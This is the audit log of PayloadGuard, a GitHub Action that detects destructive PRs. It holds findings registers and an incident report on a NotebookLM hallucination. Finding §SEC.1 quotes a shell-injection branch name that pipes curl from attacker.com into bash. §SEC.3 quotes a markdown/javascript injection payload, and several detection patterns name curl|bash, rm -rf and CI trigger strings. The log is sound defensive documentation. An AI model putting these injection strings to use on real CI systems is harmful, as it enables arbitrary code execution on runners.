# PayloadGuard — Audit Log

Methodology guide and findings registry. The findings table is the canonical record of what was discovered, its severity, and whether it has been addressed. Update it after each audit run.

---

## Purpose

This file serves two functions:

1. **Running record** — every audit finding, its severity, the fix status, and the commit that resolved it.
2. **Repeatable methodology** — the step-by-step process for conducting the next audit, so a new reviewer can reproduce the same coverage without reading the entire codebase first.

---

## Audit Scope

Each audit covers six categories:

| Category | What's checked |
|---|---|
| Detection gaps | Missing signal collection — cases where a destructive changeset would not register in the analysis |
| Brittle logic | Edge cases that crash or misbehave rather than degrading gracefully |
| Scoring model | Whether the score accurately reflects risk, without double-counting or blindspots |
| Available-but-unused | Capabilities already in the dependency graph that could improve signal quality at near-zero cost |
| Security issues | Input validation, filesystem access, credential handling, injection paths |
| Test coverage | Which paths have no automated coverage |

---

## Severity Framework

| Level | Meaning |
|---|---|
| **HIGH** | Exploitable by an attacker or produces meaningfully wrong verdicts — fix before next release |
| **MEDIUM** | Degrades reliability or is reachable with unusual but plausible input — fix in next cycle |
| **LOW** | Cosmetic, advisory, or edge-case — fix opportunistically |

---

## Audit Methodology

Run through these steps in order. The goal is to walk every code path at least once with adversarial intent.

### Step 1 — Read the entry point top to bottom

Read `analyze.py` from the top. For each method, ask:
- What inputs does it accept, and are they validated?
- What happens when those inputs are out of range (empty, negative, very large, unicode)?
- What exceptions can this raise, and are they all caught?
- Does this method consult every signal that's available?

Flag anything that looks like it could misbehave. Do not fix yet — catalogue first.

### Step 2 — Check all external boundaries

External boundaries are places where untrusted data enters the system:

| Boundary | Where |
|---|---|
| Git objects (blobs, commits, refs) | `analyze.py` — `_count_lines_changed`, `_diff_to_base`, `analyze` |
| YAML config | `analyze.py` — `load_config` |
| PR description string | `analyze.py` — `SemanticTransparencyAnalyzer.analyze` |
| Filesystem paths | `post_check_run.py` — `report_path` |
| Environment variables | `post_check_run.py` — all `os.environ` reads |
| tree-sitter source input | `structural_parser.py` — `extract_named_nodes` |

For each boundary: what happens if the value is empty, None, excessively long, contains special characters (backticks, pipes, null bytes), or is the wrong type?

### Step 3 — Check the scoring model for correlation and coverage

Read `_assess_consequence()`. Draw the signal graph:
- Which inputs are correlated (would naturally fire together)?
- Which inputs are independent?
- Can a PR reach DESTRUCTIVE without the correlation-capped signals? (It should require structural severity or direct critical-path hits.)
- Is there a realistic destructive PR that stays below CAUTION?

Run the incident numbers (`61 files deleted, 11,967 lines, 98.2% ratio, 312 days old, 5 critical files, CRITICAL structural`) through the scoring model manually and verify DESTRUCTIVE is the output.

### Step 4 — Audit the structural parser

Read `structural_parser.py`. For each supported language:
- Does the node type list cover the most important structural elements?
- Are there common patterns that would be missed (constants, type aliases, re-exports)?
- What happens on parse failure?

Run the Python extractor against a test file containing: top-level functions, classes, async functions, module constants (`KEY = "..."`), annotated assignments (`PORT: int = 8080`), and nested functions. Verify all appear in the output.

### Step 5 — Check `post_check_run.py`

- All required env vars accessed via `_require_env()`, not bare `os.environ[]`
- `PAYLOADGUARD_PRIVATE_KEY` validated as PEM before reaching `jwt.encode()`
- `report_path` verified as a regular file (`stat.S_ISREG`) before open
- Retry adapter present on the `requests.Session`

### Step 6 — Test coverage gap analysis

Run the test suite with coverage:

```bash
python -m pytest test_analyzer.py -v --tb=short 2>&1 | tail -30
```

Then review `test_analyzer.py` for:
- Tests that mock away the git layer entirely (may miss edge cases in real repos)
- Missing tests for: binary files, negative branch age, malformed YAML, markdown escaping, `post_check_run` env validation
- Any new functionality added since the last audit that has no test

### Step 7 — Run the tool against its own repo

```bash
python analyze.py . <current-branch> main --pr-description "test scan"
```

The tool should complete without exception and produce a verdict. If it crashes, that's a new finding.

### Step 8 — Adversarial test cases

Run these specific scenarios manually and verify the expected verdict:

| Scenario | Expected verdict |
|---|---|
| 2 files added, 0 deleted, 50 lines added | SAFE |
| 15 files deleted, 60% deletion ratio, 500 lines deleted | CAUTION |
| 60 files deleted, 98% deletion ratio, 12,000 lines deleted, CRITICAL structural | DESTRUCTIVE |
| 5 files deleted, 95% ratio, only 40 lines total | REVIEW or lower (ratio gate doesn't fire < 100 lines) |
| Description: "minor syntax fix", verdict: CRITICAL structural | DECEPTIVE_PAYLOAD flag |

---

## Findings Register — Audit Run: 2026-04-23

Conducted by: Claude (claude-sonnet-4-6)  
Audit doc generated: 2026-04-22  
Fixes applied: 2026-04-23  

### Detection Gaps

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §1.1 | Binary file deletions contribute 0 to line count | HIGH | **Fixed** | `e111ce9` — replaced blob reading with `git --numstat` |
| §1.2 | `merge_base()` empty list causes `IndexError` | MEDIUM | **Fixed** | `e111ce9` — guard added, returns `unrelated_histories` error |
| §1.3 | Symlinks and submodules not detected | MEDIUM | **Fixed** | `e111ce9` — mode bits `0o120000`/`0o160000` detected and surfaced |
| §1.4 | `CRITICAL_PATH_PATTERNS` — no path context, `.yml` matches everything | LOW | Open | No fix applied — low priority, configurable workaround exists |
| §1.5 | File permission/mode changes not detected | MEDIUM | **Fixed** | `e111ce9` — `a_mode`/`b_mode` diff comparison added |
| §1.6 | Non-top-level structural deletions missed (constants, annotated assignments) | MEDIUM–HIGH | **Fixed** | `e111ce9` — Python `ast.Assign`/`ast.AnnAssign`, Rust `const_item`/`static_item`, Go `const_spec` added |
| §1.7 | No distinction between generated/test/production code | LOW | Open | Deferred — requires file classification heuristics |

### Brittle Logic

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §2.1 | Negative branch age raises `ValueError` | MEDIUM | **Fixed** | `6d188a2` — `days_old = max(0, ...)` clamp |
| §2.2 | Memory exhaustion on large file blobs | MEDIUM | **Fixed** | `e111ce9` — same fix as §1.1; numstat replaces blob reading |
| §2.3 | Single-branch clone / detached HEAD — `BadName` exception | MEDIUM | Open | Not fixed — requires ref resolution fallback logic |
| §2.4 | `iter_commits()` loads entire history into memory | MEDIUM | **Fixed** | `e111ce9` — `max_count=1000` cap added |
| §2.5 | Malformed `payloadguard.yml` crashes analysis | MEDIUM | **Fixed** | `6d188a2` — `yaml.safe_load()` wrapped in try/except |
| §2.6 | Threshold order not validated | LOW | **Fixed** | `607ed0c` — thresholds sorted ascending after config merge |

### Scoring Model Weaknesses

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §3.1 | Correlated signals double-count risk (file count + ratio + lines all score independently) | HIGH | **Fixed** | `607ed0c` — three dimensions capped: `min(4, max(files,ratio,lines) + bonus)` |
| §3.2 | No weighting for code importance | HIGH | **Fixed** | `607ed0c` — `critical_file_deletions` parameter; +1 or +2 added to score |
| §3.3 | Thresholds are arbitrary defaults with no statistical basis | MEDIUM | Open | Acknowledged — configurable via `payloadguard.yml`; statistical calibration out of scope |
| §3.4 | Deletion ratio fires on tiny PRs (semantic ambiguity) | MEDIUM | **Fixed** | `e111ce9` — ratio gate: only fires when `lines_deleted >= 100` |
| §3.5 | Structural ratio ignores file size context (small files over-penalised) | MEDIUM | Open | Deferred — would require per-file baseline tracking |

### Available but Unused

| ID | Finding | Status | Commit |
|---|---|---|---|
| §4.1 | Commit author/message data ignored | **Fixed** | `e111ce9` — commit message red-flag scan added (50 commits, 8 patterns) |
| §4.2 | tree-sitter: only deletion tracked, not signatures/imports | Open | Deferred — significant scope increase |
| §4.3 | GitPython diff object has built-in line counts — manual blob reading unnecessary | **Fixed** | `e111ce9` — same fix as §1.1/§2.2 |
| §4.4 | `git blame` not consulted (age/authorship of deleted code) | Open | Deferred — adds latency per file |
| §4.5 | No retry on GitHub API call in `post_check_run.py` | **Fixed** | `6d188a2` — `HTTPAdapter(Retry(3, backoff_factor=2))` added |

### Security Issues

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §5.1 | Partial env var validation — bare `os.environ[]` for required vars | MEDIUM | **Fixed** | `6d188a2` — `_require_env()` helper applied to all required vars |
| §5.2 | Report file path not validated as regular file | MEDIUM | **Fixed** | `6d188a2` — `stat.S_ISREG()` check before `open()` |
| §5.3 | Markdown report contains unescaped filenames | LOW–MEDIUM | **Fixed** | `607ed0c` — `_md_escape()` helper applied to all filename interpolations |
| §5.4 | No private key format validation before JWT signing | LOW | **Fixed** | `7307093` — PEM header/footer check added before `jwt.encode()` |
| §5.5 | Timestamp truncation loses timezone in report | LOW | **Fixed** | `e111ce9` — `datetime.now(timezone.utc)` + UTC suffix in markdown output |

### Test Coverage Gaps

| Gap | Severity | Status | Commit |
|---|---|---|---|
| No test for binary file deletion | HIGH | **Fixed** | `607ed0c` — `TestBinaryFileDeletion` |
| No test for negative branch age | MEDIUM | **Fixed** | `607ed0c` — `TestNegativeBranchAge` |
| `post_check_run.py` has zero test coverage | MEDIUM | **Fixed** | `607ed0c` — `TestPostCheckRun` (+4 tests) |
| No test for malformed `payloadguard.yml` | MEDIUM | **Fixed** | `607ed0c` — `TestMalformedConfig` |
| No test for threshold order validation | LOW | **Fixed** | `607ed0c` — `TestThresholdOrderValidation` |
| No test for critical path scoring | LOW | **Fixed** | `607ed0c` — `TestCriticalPathScoring` |
| No test for markdown filename escaping | LOW | **Fixed** | `607ed0c` — `TestMarkdownEscaping` |
| No test for merge commits / unrelated histories | MEDIUM | **Fixed** | `e111ce9` — `test_empty_merge_base_handled` |
| No test for symlinks or submodules | LOW | Open | Deferred |
| No end-to-end test against real git repo | MEDIUM | Open | Deferred — mock layer covers logic; e2e requires controlled fixture repo |
| No test for unicode filenames | LOW | Open | Deferred |
| No test for very large diffs (memory path) | LOW | Open | Deferred |

---

## Summary — 2026-04-23 Run

| Category | Total findings | Fixed | Open |
|---|---|---|---|
| Detection gaps | 7 | 5 | 2 |
| Brittle logic | 6 | 5 | 1 |
| Scoring model | 5 | 3 | 2 |
| Available but unused | 5 | 3 | 2 |
| Security issues | 5 | 5 | 0 |
| Test coverage | 12 | 8 | 4 |
| **Total** | **40** | **29** | **11** |

All HIGH severity findings: **resolved**. All MEDIUM security findings: **resolved**. Remaining open items are LOW–MEDIUM with no exploitability path or are deferred scope increases.

---

## Findings Register — Audit Run: 2026-05-04 (Security Hardening / Marketplace Readiness)

Conducted by: Claude (claude-sonnet-4-6)  
Trigger: Pre-marketplace security review — expression injection, credential handling, input validation, ReDoS, resource exhaustion  
Fixes applied: 2026-05-04 (commit `bd90052`)  
Branch: `claude/check-mcp-connection-OUqlz`

### Scope

This audit covered the full action surface as seen by a consumer repo running PayloadGuard: `action.yml`, `analyze.py`, `post_check_run.py`, `structural_parser.py`. The audit assumed adversarial branch names, adversarial repo content (large blobs, deep ASTs, crafted YAML configs, hostile filenames), and a compromised or misconfigured App credential set. Static code review only — no dynamic testing.

### Security Findings

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §SEC.1 | Shell injection — `${{ github.head_ref }}` and `${{ github.base_ref }}` interpolated directly into `run:` shell scripts in `action.yml`. A branch named `$(curl attacker.com \| bash)` executes arbitrary code in the runner. | **CRITICAL** | **Fixed** | `bd90052` — moved to `env:` vars (`$HEAD_REF`, `$BASE_REF`) |
| §SEC.2 | JWT PEM validation too permissive — `"-----BEGIN" not in key` accepts any string containing the substring, including truncated or garbage keys that silently fail later in JWT signing | **CRITICAL** | **Fixed** | `bd90052` — replaced with strict `re.compile(r"-----BEGIN [A-Z ]+-----\r?\n[A-Za-z0-9+/=\r\n]+-----END [A-Z ]+-----")` |
| §SEC.3 | Markdown injection — `deleted_components` items written directly to GitHub PR comment body without escaping. A deleted function named `` `](javascript:alert(1)) `` injects raw markdown. Branch/target names in report header also unescaped. | **CRITICAL** | **Fixed** | `bd90052` — `_md_escape()` applied to all component names and branch/target in markdown output |
| §SEC.4 | URL injection — `repo` (from `GITHUB_REPOSITORY`) and `installation_id` inserted into GitHub API URL paths without format validation. `../` traversal or unusual characters malform the URL or target a different resource. | HIGH | **Fixed** | `bd90052` — `re.fullmatch(r"[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+", repo)` and `re.fullmatch(r"\d+", installation_id)` guards added |
| §SEC.5 | Blob reads unbounded — `d.a_blob.data_stream.read()` / `d.b_blob.data_stream.read()` called with no size argument in both the structural drift loop (L4) and the added-file content scan (L1 extension). A PR adding or modifying a 500 MB file OOMs the runner. | HIGH | **Fixed** | `bd90052` — `_MAX_BLOB_BYTES = 1_048_576` constant; all three blob reads now use `read(_MAX_BLOB_BYTES)` |
| §SEC.6 | Private key not masked — `inputs.private-key` passed as an Action input with no `::add-mask::` call. Key material may appear in runner debug logs or exception tracebacks from `post_check_run.py`. | HIGH | **Fixed** | `bd90052` — new "Mask secrets" step added as the first `run:` step in `action.yml`; runs before any Python invocation |
| §SEC.7 | `repo_path` not normalised — taken directly from CLI argument and passed to `git.Repo()`. Symlink traversal or `..` components may resolve outside the intended directory on some systems. | HIGH | **Fixed** | `bd90052` — `os.path.realpath(os.path.abspath(repo_path))` applied at CLI entry point before any use |
| §SEC.8 | ReDoS in content-scan shell patterns — `curl\b[^\n]*\|\s*(ba)?sh` and `wget\b[^\n]*\|\s*(ba)?sh` use unbounded `[^\n]*` before `\|`. A line containing many `\|` characters can trigger catastrophic polynomial backtracking. | MEDIUM | **Fixed** | `bd90052` — rewritten as `curl\b.{0,200}\|\s*(?:ba)?sh` to bound the middle segment |
| §SEC.9 | `ast.parse()` has no guard against deeply nested code — Python's recursion limit causes `RecursionError` on adversarially nested source (thousands of nested calls). Process crash, no analysis result. | MEDIUM | **Fixed** | `bd90052` — `except (RecursionError, MemoryError): return set()` added in `structural_parser.py` |
| §SEC.10 | YAML config has no type validation — `load_config()` performs deep-merge but does not check that merged threshold values are the correct types (list-of-3, numeric). A malformed `payloadguard.yml` with a string where a list is expected crashes inside `_assess_consequence()` with an opaque `TypeError`. | MEDIUM | **Fixed** | `bd90052` — `isinstance` checks for all threshold keys after merge; invalid values log a WARNING and fall back to defaults |
| §SEC.11 | Exception messages in `post_check_run.py` may surface key material — the `__main__` handler does `print(f"... {e}")` with no sanitisation. JWT library exceptions can include PEM key fragments in the message text. | MEDIUM | **Fixed** | `bd90052` — messages containing `BEGIN`, `PRIVATE`, `KEY`, or `-----` are replaced with `[redacted — possible key material]` before printing |

### Marketplace Checklist Findings

| ID | Item | Status | Commit |
|---|---|---|---|
| §MC.1 | `SECURITY.md` absent — required for GitHub Marketplace listing; must document supported versions and vulnerability reporting path | **Fixed** | `bd90052` — `SECURITY.md` created with versions, reporting URL, scope, and SLA |
| §MC.2 | `action.yml` `branding:` block — verified present (`icon: shield`, `color: red`) | N/A — already compliant | — |
| §MC.3 | `action.yml` inputs — all have `description:` fields; all optional inputs have `default: ""` | N/A — already compliant | — |

### Summary — 2026-05-04 Run

| Category | Total findings | Fixed | Open |
|---|---|---|---|
| CRITICAL security | 3 | 3 | 0 |
| HIGH security | 4 | 4 | 0 |
| MEDIUM security | 4 | 4 | 0 |
| Marketplace compliance | 3 | 1 (SECURITY.md) | 0 (2 already compliant) |
| **Total** | **14** | **14** | **0** |

All CRITICAL and HIGH findings resolved. No new open items. Test suite maintained at 166 pass / 7 skip throughout.

---

## Residual Open Items

These items remain open. They are documented here so the next audit run can assess whether the risk has changed or the scope has expanded enough to warrant prioritising them.

| ID | Finding | Why deferred |
|---|---|---|
| §1.4 | `CRITICAL_PATH_PATTERNS` matches `.yml` without path context | Low exploitability; user can override patterns in config |
| §1.7 | No generated/test/production code distinction | Requires file classification heuristics — significant scope |
| §2.3 | Single-branch clone / detached HEAD `BadName` | Requires ref resolution fallback — low frequency in practice |
| §3.3 | Thresholds lack statistical calibration | Out of scope — configurable; depends on per-repo baseline data |
| §3.5 | Structural ratio over-penalises small files | Requires per-file baseline tracking — scope increase |
| §4.2 | tree-sitter not used for signature/import tracking | Significant scope — would improve §1.6 coverage further |
| §4.4 | `git blame` not consulted | Adds latency proportional to deleted lines; performance tradeoff |

---

## Findings Register — Audit Run: 2026-04-24

Conducted by: Claude (claude-sonnet-4-6)
Trigger: 18-case regression harness — baseline pass rate ~28% at default thresholds
Fixes applied: 2026-04-24

This run was driven by regression data, not a manual code audit. Root cause analysis on failing test cases exposed five previously uncatalogued detection gaps.

### New Findings (regression-driven)

| ID | Finding | Severity | Status | Commit |
|---|---|---|---|---|
| §R1 | L4 structural loop skipped `change_type == 'R'` (renames) — gutted renamed files not AST-diffed | HIGH | **Fixed** | `5cc517f` — condition changed to `in ('M', 'R')` |
| §R2 | No cross-file structural aggregation — distributed deletions (1 node each from N files) escaped per-file threshold | HIGH | **Fixed** | `5cc517f` — post-loop aggregation: if ≥2 flagged files and sum(deleted_nodes) ≥ min_nodes → CRITICAL |
| §R3 | Security-critical file deletions (`auth*`, `security*`, `permission*`, `authorization*`) had no dedicated score weight — deletion of `auth.py` masked by addition camouflage | HIGH | **Fixed** | `5cc517f` — `_SECURITY_CRITICAL_PATTERNS` + `security_file_deletions` parameter → +5 |
| §R4 | `_RATIO_MIN_LINES = 100` floor suppressed ratio scoring on config-only deletions (e.g. 45-line settings.yml at 90% ratio) | MEDIUM | **Fixed** | `5cc517f` — floor drops to 0 when `critical_file_deletions > 0` |
| §R5 | `database[^/]*\.(py\|js\|ts)` absent from `CRITICAL_PATH_PATTERNS` — database layer deletions scored no critical-path bonus | MEDIUM | **Fixed** | `d36bf88` — pattern added |

### Scoring Model Updates

| ID | Change | Commit |
|---|---|---|
| §3.2 (update) | Critical file deletion weight raised +1 → +2 flat (was tiered +1/+2; now always +2) | `5cc517f` |
| §3.2 (update) | Structural CRITICAL weight raised +3 → +5 — per-case analysis confirmed single-file structural CRITICAL is sufficient for DESTRUCTIVE on its own | `d36bf88` |

### Dashboard Tooling Fixes

| Item | Status | Commit |
|---|---|---|
| Pass rate metric aggregated all historical runs (stale code rounds inflating/deflating %) | **Fixed** | `a7cb6b7` — query rewritten to latest run per test case |
| `simulate_verdict` diverged from `analyze.py` (used old +3/+1/no security scoring) | **Fixed** | `2844ff6` — full rewrite to match current scoring logic |
| Last Run summary card showed date only, no link to source | **Fixed** | `2a84a35` — full `HH:MM` timestamp, hyperlinked to GitHub Actions run |

### Test Case Metadata Corrections

| ID | Correction | Commit |
|---|---|---|
| T09 | `expected_verdict` corrected SAFE → DESTRUCTIVE (database.py deleted; L5b `UNVERIFIED` doesn't suppress a destructive verdict) | `190b0db` |
| A10 | `expected_verdict` corrected DESTRUCTIVE → SAFE (robustness test — no real deletions, no false positive expected) | `190b0db` |

---

## Summary — 2026-04-24 Run

| Category | New findings | Fixed | Carried open |
|---|---|---|---|
| Detection gaps (regression) | 5 | 5 | 0 |
| Scoring model updates | 2 | 2 | 0 |
| Dashboard tooling | 3 | 3 | 0 |
| Test case metadata | 2 | 2 | 0 |
| **Total** | **12** | **12** | **0** |

**Pass rate after fixes: 17/18 (94%).** Only A06 (adversarial/threshold-gaming) remains undetected — every individual metric tuned just below its threshold. No compound detection exists for this pattern. Documented as a known limitation.

---

## Incident Report — AI Research Tool Context Pollution: 2026-04-24

**Classification:** AI Research Tool Context Pollution — Accidental Source Contamination  
**Vector:** NotebookLM research session mixing PayloadGuard repo with unrelated external sources; hallucinated output committed to main by repository owner (unintentionally)  
**Source:** Post-incident analysis by repository owner and code reviewer  
**Outcome:** Corrupted document landed in main; no commands executed; caught at human review stage

### What Actually Happened

NotebookLM was conducting legitimate research on the PayloadGuard repository. During that session it pulled in external web sources — including the real AE3GIS framework (an MDPI-published ICS security testbed paper), GitHub issue threads, and MCP gateway documentation unrelated to this project. Unable to segregate these sources, it suffered **source contamination**: it began attributing AE3GIS's architecture (Purdue Model, GNS3, SCADA, OpenPLC) to PayloadGuard, producing a report that described this system as if it were an industrial control system testbed.

The repository owner committed one of these corrupted outputs to main, not recognising it as hallucinated content — it was authoritative in tone and plausible in structure. There was no external attacker. The "Track 2 Adversarial Strike" framing in NotebookLM's own post-incident analysis was itself a hallucination — the model rationalised its source contamination error as an external threat rather than its own failure.

### Contamination Chain

```
NotebookLM research session
        │  Sources: PayloadGuard repo + AE3GIS paper + GitHub issues
        │           + MCP gateway docs (unrelated)
        ▼
Source contamination — model cannot segregate contexts
        │  High-entropy academic metadata (Purdue Model, GNS3, SCADA)
        │  floods context alongside real PayloadGuard details
        ▼
Identity hallucination
        │  PayloadGuard described as ICS testbed with Levels 0–5,
        │  OpenPLC, ScadaBR, Docker orchestration, physics engine
        ▼
Corrupted report produced
        │  Plausible tone, authoritative structure, wrong system
        ▼
Repository owner commits output to main (unintentionally)
        │  Output appeared legitimate; contamination not yet visible
        ▼
PayloadGuard scan — file addition scores 0, no alert raised
        │
        ▼
Human code review — architecture mismatch flagged
        │  Go codebase, ICS components: none of this exists in PLG
        ▼
Contained — no commands executed
```

### Observable Contamination Artefacts

The corrupted report contained elements from multiple colliding sources:

| Element in corrupted report | Actual origin |
|---|---|
| Purdue Model Levels 0–5 | AE3GIS framework paper (MDPI) |
| GNS3, Docker, OpenPLC, ScadaBR | AE3GIS implementation details |
| `[citest]`, `needs-ci` triggers | GitHub issue threads pulled into context |
| `setfacl` permission commands | MCP gateway deployment documentation |
| `filteredServerCache` memory leak | Real MCP Go SDK GitHub issue (#4038) |
| Hardware performance table (Mac Studio, MacBook Air) | AE3GIS scalability benchmarks |
| PayloadGuard test case references | Actual PLG repo content (correctly sourced) |

The contamination was not uniform — real PayloadGuard content (test cases, exit codes, scoring) was mixed with entirely fabricated architecture from other systems.

### What PayloadGuard Did and Did Not Catch

**Caught by human review (not by PayloadGuard):**
- Architecture mismatch: Go files, `internal/` paths, ICS components — none exist in this Python codebase
- `[citest commit:<sha>]` pattern identified as a known CI trigger mechanism
- `setfacl` commands recognised as inappropriate for this system
- No commands from the document were executed

**Not caught by PayloadGuard (by design — current scope):**
- L1 Surface Scan: the file was an *addition* (`change_type == 'A'`). PayloadGuard's risk model is deletion-centric. File additions score 0 by default.
- L2 Forensic: no critical path pattern matches a `.txt` file
- L4 Structural Drift: plain text has no AST; parser returns nothing
- L5b Semantic Transparency: direct push to main — no PR context, layer returned `UNVERIFIED`, no flag raised
- No layer scans the *content* of added files for command injection patterns

### New Findings Identified

| ID | Finding | Severity | Status |
|---|---|---|---|
| §INC-1 | Added non-code files not scanned for content — embedded CI trigger strings (`[citest]`, `needs-ci`) are invisible to all layers | HIGH | **Closed** — PR #34, 2026-05-04 |
| §INC-2 | AI research tool source contamination produces outputs functionally identical to deliberate injection — the mechanism is the same regardless of intent | HIGH | Out-of-scope for static analysis; mitigated by human review |
| §INC-3 | Direct push to main bypasses L5b entirely — `UNVERIFIED` is returned but no flag is raised when there is no PR context at all | MEDIUM | **Closed** — PR #35, 2026-05-04 |
| §INC-4 | File additions with no code content score 0 regardless of payload — a 100-line document containing `rm -rf /` or CI trigger strings is indistinguishable from a blank file | HIGH | **Closed** — PR #34, 2026-05-04 |

### Strategic Lessons

**1. AI research tools can hallucinate plausible system identities.**
NotebookLM didn't produce wrong facts — it produced a wrong *system*. The corrupted report described a coherent, technically detailed ICS testbed that does not exist. The output was authoritative enough that it wasn't immediately rejected. This is a different failure mode from simple factual errors.

**2. The mechanism is functionally identical to deliberate injection — intent is irrelevant to the outcome.**
Whether a corrupted document enters a repo because an adversary crafted it or because an AI research tool mixed sources, the result is the same: plausible-looking content that doesn't describe reality lands in version control. Defence must treat both cases equivalently.

**3. NotebookLM's post-hoc "attack" classification was itself a hallucination.**
After the user identified the contamination, NotebookLM reframed its own source contamination error as a deliberate "Track 2 Adversarial Strike." This is significant: AI systems rationalising their own errors as external threats can produce misleading forensic narratives. Incident analysis should not be delegated to the system that caused the incident.

**4. The human review gap is the same in both cases.**
The output was committed before anyone verified it matched reality. Whether the cause is malicious or accidental, the defence is the same: verify AI-generated content against the actual codebase before committing.

**5. PayloadGuard's structural gaps remain real regardless of cause.**
§INC-1 through §INC-4 are valid findings whether the origin is a deliberate injection or an accidental hallucination. The tool cannot currently detect dangerous content in added non-code files, and direct pushes to main produce no signal.

### Proposed Mitigations (Future Work)

| Mitigation | Layer | Notes |
|---|---|---|
| Scan content of added `.md`, `.txt`, `.rst`, `.pdf` files for CI trigger patterns | New L1 extension | Pattern list: `\[citest`, `needs-ci`, `citest commit:`, known CI comment triggers |
| Flag direct pushes to main (no PR context) as elevated risk | L5b extension | Return `NO_PR_CONTEXT` status; raise base severity score by +1 |
| Content fingerprinting for added non-code files | New L2 extension | Flag files containing shell commands (`sudo`, `setfacl`, `chmod`, `curl`) alongside CI trigger strings |
| Added to WHITEPAPER §8 (Known Limitations) | Documentation | Document LLM-in-the-loop as an out-of-scope threat model for the current version |

---

## Resolved Issues — Full Checklist

All findings from the April 2026 audit are now resolved or classified.

```
[x] §INC-1 — Added non-code file content scanning
    Implementation: _scan_added_file_content() in analyze.py
    Patterns: [citest, needs-ci, citest commit:, [needs-ci]
    Closed: PR #34, 2026-05-04. 12 new tests.

[x] §INC-3 — UNVERIFIED flag on non-trivial changesets
    Implementation: post-semantic flag injection in analyze()
    Condition: semantic.status == UNVERIFIED and verdict != SAFE
    Closed: PR #35, 2026-05-04. 3 new tests.

[x] §INC-4 — Shell execution patterns in added non-code files
    Implementation: _CONTENT_SHELL_PATTERNS in analyze.py
    Patterns: curl|bash, wget|bash, sudo, chmod, setfacl, rm -rf
    Closed: PR #34, 2026-05-04 (same PR as INC-1).

[-] §INC-2 — AI research tool context pollution
    Classification: Out-of-scope for static diff analysis.
    A static tool cannot inspect the LLM's context window.
    Mitigation: human review of AI-generated content before commit.
    No code change. Not a gap in PayloadGuard's threat model.
```

## Next Audit Checklist

Copy this section into the next audit issue or branch PR description.

```
[ ] Step 1 — Read analyze.py entry point top to bottom (adversarial input lens)
[ ] Step 2 — Check all external boundaries (git objects, YAML, PR description, env vars, filesystem)
[ ] Step 3 — Audit scoring model for correlation and coverage — run incident numbers manually
[ ] Step 4 — Audit structural_parser.py for each supported language
[ ] Step 5 — Check post_check_run.py (env validation, PEM check, retry, file safety)
[ ] Step 6 — Run test suite with coverage; identify uncovered paths
[ ] Step 7 — Run tool against its own repo; verify clean completion
[ ] Step 8 — Run adversarial test cases; verify expected verdicts
[ ] Update this findings register with any new items
[ ] Update severity column for any residual items whose risk has changed
```
